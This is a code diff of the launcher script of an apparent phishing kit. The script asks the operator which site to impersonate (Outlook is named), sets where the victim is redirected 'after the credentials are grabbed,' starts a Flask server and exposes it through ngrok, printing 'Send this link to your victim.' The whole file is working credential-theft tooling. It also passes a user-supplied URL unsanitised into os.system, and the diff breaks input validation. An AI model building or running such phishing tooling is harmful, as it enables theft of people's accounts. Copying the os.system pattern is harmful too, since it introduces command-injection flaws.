@@ -1,16 +1,20 @@
-import pyngrok.exception
-import colorama
-import pyngrok
-import signal
-import utils
+import zipfile
+import sys
 import time
+import stat
+import signal
+import requests
+import utils
+import colorama
 import os
 
-from sites import siteLookUp, siteDefaultRedirect
-from threading import Thread
-from pyngrok import ngrok
-from colorama import Fore
+
+from colorama import Fore, Back, Style
+from os import system
 from sys import platform
+from threading import Thread
+from sites import siteLookUp, siteDefaultRedirect
+from pyngrok import ngrok
 
 
 # Want to contribute? Make a fork and a pull request to the dev branch! I made the logo on placeit and converted into using https://www.text-image.com/convert/ascii.html. Thanks!! please star
@@ -73,9 +77,10 @@ colorama.init(autoreset=True)
 #### Detects SIGINT
 def signal_handler(sig, frame):
     print(Fore.RED + '\nExiting...(You pressed Ctrl+C)')
-    os._exit(0)
+    exit(0)
 
-signal.signal(signal.SIGINT, signal_handler)
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, signal_handler)
 
 #### Detects the Operating System
 if platform in ('linux', 'linux2', 'darwin'):
@@ -89,13 +94,11 @@ else:
 
 #### Starts ngrok tunnel utilizing pyngrok
 def start_ngrok(port):
-    try:
-        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Send this link to your victim: " + Fore.CYAN + ngrok.connect(port, "http").public_url.replace("http" , "https"))
-        ngrok_process = ngrok.get_ngrok_process()
-        ngrok_process.proc.wait()
-    except (pyngrok.exception.PyngrokNgrokError, ConnectionResetError):
-        print(Fore.RED + '\nExiting...(You pressed Ctrl+C)')
-        os._exit(0)
+    http_tunnel = ngrok.connect(port, "http")
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Send this link to your victim: " + Fore.CYAN + http_tunnel.public_url.replace("http" , "https"))
+    ngrok_process = ngrok.get_ngrok_process()
+    ngrok_process.proc.wait()
+
 
 #### Clears terminal and prints ASCII art
 os.system(commands.clear)
@@ -124,7 +127,7 @@ def split_block(lst, se):
             final.append(index)
     return final
     
-for site in split_block(list(siteLookUp.keys()), 6): 
+for site in split_block(list(siteLookUp.keys()), 2): 
     for number in site:
 
 #### Clears the console and prints the ASCII art
@@ -134,16 +137,13 @@ for site in split_block(list(siteLookUp.keys()), 6):
 
                                     ############################################################# Questions/ Input #############################################################
 #### Selects the site to create a phishing page for (currently Outlook)
-while True:
-    try:
-        site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: "))
-        break
-    except (ValueError, TypeError):
-        print(Fore.RED + 'Please choose a valid site.')
-        
-
+try:
+    site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: "))
+except (ValueError, TypeError) as error:
+    print(Fore.RED + '\nExiting...(You pressed Ctrl+C)')
 #### Selects the vicitim would be redirected to after the credientials are grabbed
-redirect_url = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Enter redirect URL:" + Fore.YELLOW + f" ({siteDefaultRedirect[site]})" + Fore.GREEN + ": ") or siteDefaultRedirect[site]
+redirect_url = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Enter redirect url:" + Fore.YELLOW + f" ({siteDefaultRedirect[site]})" + Fore.GREEN + ": ") or siteDefaultRedirect[site]
+   
 
 #### Selects the host to run the flask server to run on, you can use private IP to be available in LAN
 host = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server host" + Fore.YELLOW + " (localhost)" + Fore.GREEN + ": ") or "localhost"
@@ -152,21 +152,19 @@ host = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + 
 port = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server port" + Fore.YELLOW + " (49467)" + Fore.GREEN + ": ") or 49467
 
 #### Determines to use ngrok or not
-ngrok_use = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Use nGrok?" + Fore.YELLOW + " (Y/n)" + Fore.GREEN + ": ") or "y"
+ngrok_use = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Use nGrok?" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "y"
 
 #### Tells flask to display HTTP requests or not
-display_reqs = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Display HTTP requests? (for development)" + Fore.YELLOW + " (y/N)" + Fore.GREEN + ": ") or "n"
+display_reqs = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Display HTTP requests? (not reccomended)" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "n"
 
 #### Tells user if its starting server
 print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Starting flask server...")
-
 
                                      ############################################################# Execution #############################################################
 
 #### Executes app.py
 def exec(site):
     time.sleep(2)
-    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + f" Running flask server on http://{host}:{port}\n") if display_reqs != "y" and ngrok_use != "y" else None
     print("\n")
     try:
         siteName = siteLookUp[site]
@@ -174,7 +172,7 @@ def exec(site):
         raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title")
 
     #Using this instead of a string to be more portable and possibly prevent issues
-    os.system(f"{python_cmd} {os.path.join('Sites', siteName, 'app.py')} {redirect_url} {host} {port} {siteName} {display_reqs} {ngrok_use}")
+    os.system(f"{python_cmd} {os.path.join('Sites', siteName, 'app.py')} {redirect_url} {host} {port} {siteName} {display_reqs}")
 
 #### Detects if ngrok is being used and executes it
 if ngrok_use=="y":
